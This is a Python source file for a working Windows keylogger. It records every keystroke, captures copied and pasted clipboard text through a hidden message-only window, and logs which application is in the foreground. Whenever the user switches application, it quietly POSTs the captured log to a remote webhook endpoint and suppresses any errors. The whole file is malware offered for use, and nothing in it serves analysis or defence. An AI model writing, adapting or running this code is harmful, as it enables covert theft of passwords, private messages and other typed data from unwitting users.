import threading
import time
import ctypes
import requests
import win32gui
import win32process
import win32clipboard
import win32con
import win32api
import psutil
from pynput import keyboard
from datetime import datetime

WEBHOOK_URL = "https://webhook.site/ENDPOINT"  # ← Replace this with your actual endpoint
WM_CLIPBOARDUPDATE = 0x031D


class AppKeylogger:
    def __init__(self):
        self.lock = threading.Lock()
        self.log_buffer = []
        self.current_app = None
        self.pressed = set()
        self.running = True

        # Create and register a message-only window for clipboard monitoring
        self.hwnd = self._create_message_window()
        ctypes.windll.user32.AddClipboardFormatListener(self.hwnd)

        # Start thread to detect active app changes
        threading.Thread(target=self._app_change_detector, daemon=True).start()

        # Set up keyboard listener
        self.listener = keyboard.Listener(
            on_press=self._on_key_press,
            on_release=self._on_key_release
        )

    def _create_message_window(self):
        """Create hidden message-only window for WM_CLIPBOARDUPDATE."""
        def _wnd_proc(hwnd, msg, wparam, lparam):
            if msg == WM_CLIPBOARDUPDATE:
                self._read_clipboard()
            return win32gui.DefWindowProc(hwnd, msg, wparam, lparam)

        wc = win32gui.WNDCLASS()
        wc.lpfnWndProc = _wnd_proc
        wc.lpszClassName = "ClipboardListener"
        wc.hInstance = win32api.GetModuleHandle(None)

        class_atom = win32gui.RegisterClass(wc)

        return win32gui.CreateWindowEx(
            0,
            class_atom,
            "ClipboardListenerWindow",
            0,
            0, 0, 0, 0,
            win32con.HWND_MESSAGE,
            0,
            wc.hInstance,
            None
        )

    def _read_clipboard(self):
        """Handle WM_CLIPBOARDUPDATE: read Unicode text from clipboard."""
        try:
            win32clipboard.OpenClipboard()
            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
                data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
            else:
                data = ""
        except Exception:
            data = ""
        finally:
            try:
                win32clipboard.CloseClipboard()
            except Exception:
                pass

        if data:
            with self.lock:
                self.log_buffer.append(f"[COPIED]: {data}\n")

    def _get_active_app(self):
        """Return current foreground application's process name and window title."""
        hwnd = win32gui.GetForegroundWindow()
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        try:
            name = psutil.Process(pid).name()
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            name = "Unknown"
        title = win32gui.GetWindowText(hwnd)
        return f"{name} - {title}"

    def _app_change_detector(self):
        """Detect when user switches between applications."""
        last = None
        while self.running:
            app = self._get_active_app()
            if app != last:
                with self.lock:
                    if self.log_buffer:
                        self._send_buffer(last)
                        self.log_buffer.clear()
                    self.log_buffer.append(f"\n--- Switched to: {app} ---\n")
                last = app
                self.current_app = app
            time.sleep(0.5)

    def _on_key_press(self, key):
        with self.lock:
            self.pressed.add(key)

            if self._ctrl_down() and hasattr(key, "char") and key.char:
                c = key.char.lower()
                if c == "c":
                    self.log_buffer.append("[CTRL+C]\n")
                    return
                elif c == "v":
                    self.log_buffer.append("[CTRL+V]\n")
                    pasted = self._get_clipboard_content()
                    if pasted:
                        self.log_buffer.append(f"[PASTED]: {pasted}\n")
                    else:
                        self.log_buffer.append("[PASTED]: <empty or inaccessible>\n")
                    return

            if hasattr(key, "char") and key.char and ord(key.char) >= 32:
                self.log_buffer.append(key.char)
            elif hasattr(key, "name"):
                if key.name == "space":
                    self.log_buffer.append(" ")
                elif key.name == "enter":
                    self.log_buffer.append("\n")
                elif key.name == "tab":
                    self.log_buffer.append("\t")
                elif key.name not in ("ctrl_l", "ctrl_r"):
                    self.log_buffer.append(f"[{key.name.upper()}]")
            else:
                self.log_buffer.append(str(key))

    def _on_key_release(self, key):
        self.pressed.discard(key)

    def _get_clipboard_content(self, retries=5, delay=0.05):
        """
        Try to get clipboard text, retrying if clipboard is temporarily locked.
        """
        for _ in range(retries):
            try:
                win32clipboard.OpenClipboard()
                if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
                    data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
                    return data
                return ""
            except Exception:
                time.sleep(delay)  # wait and retry
            finally:
                try:
                    win32clipboard.CloseClipboard()
                except Exception:
                    pass
        return ""


    def _ctrl_down(self):
        return keyboard.Key.ctrl_l in self.pressed or keyboard.Key.ctrl_r in self.pressed

    def _send_buffer(self, app_name):
        """Send captured log buffer to webhook."""
        payload = {
            "application": app_name or "Unknown",
            "log": "".join(self.log_buffer),
            "timestamp": datetime.now().isoformat()
        }
        try:
            requests.post(WEBHOOK_URL, json=payload, timeout=5)
        except requests.RequestException:
            pass  # Silently fail

    def start(self):
        """Start keylogger and clipboard listener."""
        self.listener.start()
        self.listener.join()  # Main thread blocked here
        self.running = False
        with self.lock:
            if self.log_buffer:
                self._send_buffer(self.current_app)


if __name__ == "__main__":
    kl = AppKeylogger()

    # Start keyboard listener in background
    threading.Thread(target=kl.listener.start, daemon=True).start()

    # Run the clipboard listener in the main thread
    win32gui.PumpMessages()
